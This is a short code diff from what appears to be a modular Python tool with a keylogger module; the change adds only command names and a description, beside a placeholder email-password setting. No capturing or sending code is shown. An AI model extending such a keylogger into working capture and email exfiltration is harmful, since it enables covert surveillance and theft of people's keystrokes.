@@ -8,6 +8,10 @@ EMAIL_PASSWORD = "put_real_pw"
 
 class mod_keylogger(mod_interface):
 
+    cmd_short = "kl"
+    cmd_long = "keylogger"
+    cmd_desc = "Keylogger module"
+
     def setup_mod(self):
         print(f'Module Setup (mod_keylogger) called successfully!')
         pass
